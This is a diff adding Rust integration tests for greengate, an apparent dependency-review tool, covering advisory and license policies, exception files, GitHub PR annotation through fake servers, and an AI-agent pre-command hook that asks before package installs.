+        .map(|f| f["rule"].as_str().unwrap())
+        .collect();
+    assert!(rules.contains(&"OSV/GHSA-test-lodash"), "{rules:?}");
+    assert!(rules.contains(&"LICENSE/Denied"), "{rules:?}");
+}
+
+#[test]
+fn deps_review_policy_and_exceptions() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    review_repo(d);
+    let (osv, _) = fake_http(review_osv);
+    let (npm, _) = fake_http(review_registry);
+    // Advisories warn below critical; licenses are not denied; an exception
+    // waives nothing else — the review passes with warnings.
+    std::fs::write(
+        d.join(".greengate.toml"),
+        "[dependency_review]\nfail_on_severity = \"critical\"\n",
+    )
+    .unwrap();
+    let out = review_cmd(d, &osv, &npm).output().unwrap();
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert_eq!(out.status.code(), Some(0), "{stderr}");
+    assert!(
+        stderr.contains("Warnings") && stderr.contains("GHSA-test-lodash"),
+        "{stderr}"
+    );
+    assert!(stderr.contains("npm install lodash@^4.17.21"), "{stderr}");
+
+    // Back to failing on high, with an exception for the advisory.
+    std::fs::write(d.join(".greengate.toml"), "").unwrap();
+    std::fs::create_dir_all(d.join(".greengate")).unwrap();
+    std::fs::write(
+        d.join(".greengate/exceptions.toml"),
+        format!(
+            "[[exception]]\nid = \"EX-1\"\nmatch = {{ advisory = \"GHSA-test-lodash\", package = \"lodash\" }}\nreason = \"not reachable\"\nowner = \"@web\"\nexpires = \"{}\"\n",
+            date_in(10)
+        ),
+    )
+    .unwrap();
+    let (code, report) = {
+        let path = d.join("r.json");
+        let out = review_cmd(d, &osv, &npm)
+            .arg("--report")
+            .arg(&path)
+            .output()
+            .unwrap();
+        (
+            out.status.code(),
+            serde_json::from_str::<serde_json::Value>(&std::fs::read_to_string(path).unwrap())
+                .unwrap(),
+        )
+    };
+    assert_eq!(code, Some(0), "{report}");
+    assert_eq!(report["suppressed"][0]["suppression"]["id"], "EX-1");
+}
+
+#[test]
+fn deps_review_without_changes_passes() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    review_repo(d);
+    git_commit_all(d, "head");
+    let (osv, log) = fake_http(review_osv);
+    let (npm, _) = fake_http(review_registry);
+    let out = Command::new(binary())
+        .args(["deps", "review", "--base", "HEAD"])
+        .current_dir(d)
+        .env("GREENGATE_OSV_URL", &osv)
+        .env("GREENGATE_NPM_REGISTRY", &npm)
+        .env("GREENGATE_CACHE_DIR", d.join(".cache"))
+        .output()
+        .unwrap();
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert_eq!(out.status.code(), Some(0), "{stderr}");
+    assert!(stderr.contains("no dependency changes"), "{stderr}");
+    assert!(log.lock().unwrap().is_empty(), "nothing to look up");
+}
+
+/// GitHub: one existing greengate comment (id 99) on PR 7.
+fn review_github(method: &str, path: &str, _: &str) -> (u16, String) {
+    match (method, path) {
+        ("POST", "/repos/o/r/check-runs") => (201, r#"{"id": 5}"#.into()),
+        ("PATCH", "/repos/o/r/check-runs/5") => (200, "{}".into()),
+        ("GET", p) if p.starts_with("/repos/o/r/issues/7/comments") => (
+            200,
+            r#"[{"id": 98, "body": "LGTM"}, {"id": 99, "body": "<!-- greengate:deps-review -->\nold"}]"#.into(),
+        ),
+        ("PATCH", "/repos/o/r/issues/comments/99") => (200, "{}".into()),
+        _ => (404, "{}".into()),
+    }
+}
+
+#[test]
+fn deps_review_annotate_updates_one_comment() {
+    let dir = tempfile::tempdir().unwrap();
+    let d = dir.path();
+    review_repo(d);
+    let (osv, _) = fake_http(review_osv);
+    let (npm, _) = fake_http(review_registry);
+    let (gh, log) = fake_http(review_github);
+    let out = review_cmd(d, &osv, &npm)
+        .args(["--annotate", "--format", "markdown"])
+        .env("GITHUB_API_URL", &gh)
+        .env("GITHUB_TOKEN", "t")
+        .env("GITHUB_REPOSITORY", "o/r")
+        .env("GITHUB_SHA", "abc")
+        .env("GITHUB_REF", "refs/pull/7/merge")
+        .env_remove("GITHUB_EVENT_PATH")
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(1));
+    let md = String::from_utf8_lossy(&out.stdout);
+    assert!(md.starts_with("<!-- greengate:deps-review -->"), "{md}");
+    assert!(
+        md.contains("### How to fix") && md.contains("npm install lodash@^4.17.21"),
+        "{md}"
+    );
+    let log = log.lock().unwrap();
+    let calls: Vec<(&str, &str)> = log
+        .iter()
+        .map(|(m, p, _)| (m.as_str(), p.as_str()))
+        .collect();
+    assert!(
+        calls.contains(&("PATCH", "/repos/o/r/issues/comments/99")),
+        "{calls:?}"
+    );
+    assert!(
+        !calls
+            .iter()
+            .any(|(m, p)| *m == "POST" && p.contains("/issues/")),
+        "updated in place, not posted again: {calls:?}"
+    );
+    let annotated = log
+        .iter()
+        .find(|(m, p, b)| {
+            *m == "PATCH" && p.ends_with("/check-runs/5") && b.contains("annotations")
+        })
+        .expect("annotations were sent");
+    let body: serde_json::Value = serde_json::from_str(&annotated.2).unwrap();
+    let a = &body["output"]["annotations"][0];
+    assert_eq!(a["path"], "package-lock.json");
+    assert!(
+        a["start_line"].as_u64().unwrap() > 1,
+        "points at the lockfile entry: {a}"
+    );
+    let done = log
+        .iter()
+        .find(|(m, p, b)| *m == "PATCH" && p.ends_with("/check-runs/5") && b.contains("completed"))
+        .unwrap();
+    assert!(done.2.contains("\"failure\""));
+}
+
+// ── check-command and the agent hook ─────────────────────────────────────────
+
+fn hook(dir: &std::path::Path, command: &str, extra: &[&str]) -> (Option<i32>, String) {
+    use std::io::Write;
+    let mut child = Command::new(binary())
+        .args(["hook", "claude-code"])
+        .args(extra)
+        .current_dir(dir)
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::null())
+        .spawn()
+        .unwrap();
+    let event = serde_json::json!({
+        "hook_event_name": "PreToolUse",
+        "tool_name": "Bash",
+        "tool_input": {"command": command},
+        "cwd": dir,
+    });
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(event.to_string().as_bytes())
+        .unwrap();
+    let out = child.wait_with_output().unwrap();
+    (
+        out.status.code(),
+        String::from_utf8_lossy(&out.stdout).into_owned(),
+    )
+}
+
+#[test]
+fn check_command_reports_on_dependency_installs_only() {
+    let dir = tempfile::tempdir().unwrap();
+    let out = run_in(
+        dir.path(),
+        &["check-command", "--", "npm test && cargo build"],
+    );
+    assert_eq!(out.status.code(), Some(0));
+    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
+    assert_eq!(report["schema"], "greengate.report/v1");
+    assert_eq!(report["status"], "passed");
+
+    // An install greengate cannot plan is not a pass.
+    let out = run_in(
+        dir.path(),
+        &["check-command", "--", "poetry", "add", "requests"],
+    );
+    assert_eq!(out.status.code(), Some(3));
+    let report: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
+    assert_eq!(report["status"], "incomplete");
+    assert!(
+        report["checks"][0]["reason"]
+            .as_str()
+            .unwrap()
+            .contains("Poetry")
+    );
+}
+
+#[test]
+fn hook_is_silent_for_other_commands_and_asks_when_unsure() {
+    let dir = tempfile::tempdir().unwrap();
+    assert_eq!(
+        hook(dir.path(), "git status && ls", &[]),
+        (Some(0), String::new())
+    );
+
+    let (code, out) = hook(dir.path(), "cargo install ripgrep", &[]);
+    assert_eq!(code, Some(0));
+    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
+    assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "ask");
+
+    // Out of time before the plan could run: ask, never allow.
+    let (code, out) = hook(
+        dir.path(),
+        "npm i left-pad",
+        &["--budget-secs", "0", "--allow-on-pass"],
+    );
+    assert_eq!(code, Some(0));
+    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
+    assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "ask");
+    assert!(
+        v["hookSpecificOutput"]["permissionDecisionReason"]
+            .as_str()
+            .unwrap()
+            .contains("budget"),
+        "{v}"
+    );
+}
+
+#[test]
+fn hook_never_exits_2_on_a_broken_config() {
+    // Exit 2 would block every shell command the agent runs.
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join(".greengate.toml"), "not = [valid").unwrap();
+    assert_eq!(hook(dir.path(), "ls", &[]), (Some(0), String::new()));
 }
